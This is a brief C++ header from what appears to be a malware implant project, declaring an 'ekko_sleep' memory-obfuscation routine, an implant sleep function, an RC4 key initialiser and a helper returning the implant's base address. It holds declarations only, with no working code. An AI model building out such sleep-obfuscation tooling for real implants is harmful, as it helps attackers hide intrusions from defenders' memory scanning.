//
// Created by diago on 2024-05-24.
//

#ifndef SLEEP_HPP
#define SLEEP_HPP
#include <Windows.h>
#include <cstdint>
#include <ctime>
#include <structs.hpp>
#include <common.hpp>

namespace obfus {
    void ekko_sleep(uint32_t sleep_time, void* image_base, uint32_t image_size);
    void sleep(const implant_context& ctx);
}

void init_rc4_key(USTRING* pKey);
uint8_t* get_implant_base_address();

#endif //SLEEP_HPP
